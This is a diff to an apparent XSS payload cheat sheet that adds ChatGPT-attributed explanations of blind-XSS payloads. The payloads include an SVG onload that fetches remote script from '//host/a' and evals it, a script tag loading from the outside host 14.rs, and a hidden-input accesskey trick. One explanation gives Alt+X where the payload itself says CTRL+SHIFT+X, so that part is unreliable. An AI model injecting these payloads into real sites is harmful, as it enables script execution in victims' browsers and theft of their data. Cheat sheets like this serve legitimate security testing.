@@ -379,6 +379,15 @@ Most tools are also suitable for blind XSS attacks:
 
 ```html
 <svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
+```
+**ChatGPT Explationation:**  
+1. The JavaScript code uses the fetch() method to send an HTTP GET request to the specified host ("//host/a") to XSS payload.
+2. Once the XSS payload is retrieved, it uses .text() method to parse the response as text. 
+3. The final step is to use the eval() function to execute the text as JavaScript code.
+
+---
+
+```html
 <script src=14.rs>
 // you can also specify an arbitrary payload with 14.rs/#payload
 e.g: 14.rs/#alert(document.domain)
@@ -390,6 +399,11 @@ e.g: 14.rs/#alert(document.domain)
 <input type="hidden" accesskey="X" onclick="alert(1)">
 Use CTRL+SHIFT+X to trigger the onclick event
 ```
+**ChatGPT Explationation:**  
+1. The input element is used to create form controls for web pages, such as text fields, checkboxes, and buttons. In this case, the type of the input element is "hidden", which means that it will not be visible on the page and the user will not be able to interact with it directly.
+2. The "accesskey" attribute allows you to specify a shortcut key to activate or focus the element. In this case, the accesskey is "X", which means that if the user press "Alt+X" the focus will be on this element.
+3. The onclick event triggers a JavaScript alert() function when the element is clicked. This will display an alert box with the text "1" to the user.
+---
 
 ### XSS when payload is reflected capitalized
 
